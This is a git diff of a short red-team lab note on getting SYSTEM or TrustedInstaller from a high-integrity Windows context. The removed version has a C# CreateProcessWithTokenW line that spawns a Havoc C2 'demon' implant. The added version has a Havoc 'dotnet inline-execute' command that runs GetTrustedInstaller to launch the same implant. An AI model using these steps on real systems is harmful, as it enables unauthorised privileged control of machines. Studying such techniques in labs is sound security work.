@@ -1,15 +1,14 @@
 # Lab - GetSystem
 
-A very lipme lab stat shows you another way of getting SYSTEM when running in a high integrity context.
+A very simple lab stat shows you another way of getting SYSTEM when running in a high integrity context.
 
-<https://github.com/fgsec/SharpGetSystem>
+<https://github.com/rara64/GetTrustedInstaller>
 
-uses named pipes
+Compile the code and upload with updog2 to kali /opt/Havoc/assemblies
 
-change the source code of console.cs1 to spawn a beacon instead of a cmd.exe
-
-```csharp
- bool result = Pinvoke.CreateProcessWithTokenW(systemToken, 0x00000001, "C:\\temp\\demon.x64.exe", null, 0x00000010, IntPtr.Zero, null, ref si, out pi);
- ```
-
-![image](./images/lab_getsystem_source.jpg)
+From your demon session in Havoc C2 Client
+```bash
+dotnet inline-execute /opt/Havoc/assemblies/GetTrustedInstaller.exe "c:\temp\demon.x64.exe"
+```
+![image](./images/lab_getsystem_trusted.jpg)
+![image](./images/lab_getsystem_si.jpg)
